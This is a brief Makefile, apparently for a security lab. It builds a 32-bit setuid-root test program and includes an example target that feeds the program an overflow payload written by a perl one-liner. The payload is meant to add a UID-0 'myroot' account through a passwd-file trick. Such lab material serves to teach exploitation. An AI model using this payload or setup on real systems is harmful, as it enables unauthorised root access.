TARGET_SRC=target.c
TARGET_EXE=target
OP=-m32

all: $(TARGET_EXE)

$(TARGET_EXE): $(TARGET_SRC)
	gcc $(OP) $(TARGET_SRC) -o $(TARGET_EXE)
	sudo chown root:root $(TARGET_EXE)
	sudo chmod u+s $(TARGET_EXE)

registeration_example: $(TARGET_EXE)
	mkdir -p /tmp/etc && ln -fs /bin/bash /tmp/etc/passwd
	./target `perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A" x 76 . ":/root:/tmp/etc/passwd"'`

clean:
	rm -f $(TARGET_EXE)
